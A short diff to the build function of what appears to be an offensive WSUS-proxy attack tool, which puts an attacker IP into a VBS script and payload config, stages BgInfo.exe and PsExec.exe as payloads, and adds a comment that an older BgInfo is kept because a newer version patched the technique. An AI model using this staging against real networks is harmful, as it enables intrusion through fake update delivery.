@@ -54,7 +54,8 @@ build () {
 	python $SCRIPT_DIR/resources/create_bgi.py
 	sed s/TARGET_IP/$IPADDR/ < $SCRIPT_DIR/resources/script.vbs > /tmp/payloads/script.vbs
 	sed s/TARGET_IP/$IPADDR/ < $SCRIPT_DIR/resources/payloads.ini > $SCRIPT_DIR/wsuspect-proxy/payloads/payloads.ini
-        cp $SCRIPT_DIR/resources/BgInfo.exe $SCRIPT_DIR/wsuspect-proxy/payloads/.
+	# Thats a Bginfo.exe v4.20 - Microsoft patched that technique on the newest Bginfo.exe version (v4.22).
+        cp $SCRIPT_DIR/resources/Bginfo.exe $SCRIPT_DIR/wsuspect-proxy/payloads/.
 	cp $SCRIPT_DIR/resources/PsExec.exe $SCRIPT_DIR/wsuspect-proxy/payloads/.
 	chmod -R 777 /tmp/payloads/*
 	service smbd restart
